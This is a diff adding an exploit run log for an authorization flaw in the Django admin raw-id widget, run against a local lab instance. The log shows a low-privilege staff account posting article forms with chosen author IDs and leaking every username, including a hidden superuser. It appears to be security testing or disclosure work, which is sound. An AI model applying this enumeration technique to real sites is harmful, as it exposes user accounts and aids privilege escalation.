@@ -1,0 +1,20 @@
+==========================================================================
+VULN-007: ForeignKeyRawIdWidget staff IDOR → auth.User enumeration
+target : http://localhost:20796  (commit 9e06baf2e4dd)
+==========================================================================
+[INFO] exercising vulnerable code path: contrib/admin/widgets.py:214 unscoped _default_manager.get(pk=attacker)
+[SETUP] provisioning low-priv staff attacker mod_75fbfa57 (labapp only) + hidden superuser victimsu_75fbfa57 via the app ORM
+[SETUP] attacker pk=6, hidden-superuser pk=7 (victimsu_75fbfa57); 7 users exist in total
+[STEP] logged into /admin/ as mod_75fbfa57 (is_staff, no auth.User perms)
+[STEP] attacker GET /admin/auth/user/ -> HTTP 403 (expected 403: no view perm on auth.User)
+[STEP] abusing the raw_id widget: POST article/add/ with author=<pk>, blank title
+[PROOF] author=1 leaked username -> 'admin'
+[PROOF] author=2 leaked username -> 'staff'
+[PROOF] author=3 leaked username -> 'alice'
+[PROOF] author=4 leaked username -> 'mod_223a7d10'
+[PROOF] author=5 leaked username -> 'victimsu_223a7d10'
+[PROOF] author=6 leaked username -> 'mod_75fbfa57'
+[PROOF] author=7 leaked username -> 'victimsu_75fbfa57' <== HIDDEN SUPERUSER
+[PROOF] attacker with ZERO auth.User rights recovered hidden superuser 'victimsu_75fbfa57' (pk=7) purely via the widget
+[OK] exploit confirmed — enumerated 7/7 usernames incl. superuser(s); no permission on auth.User was ever held
+==> VULN-007: CONFIRMED — low-priv staff enumerated 7 auth.User usernames (incl. hidden superuser) via raw_id widget, bypassing authz
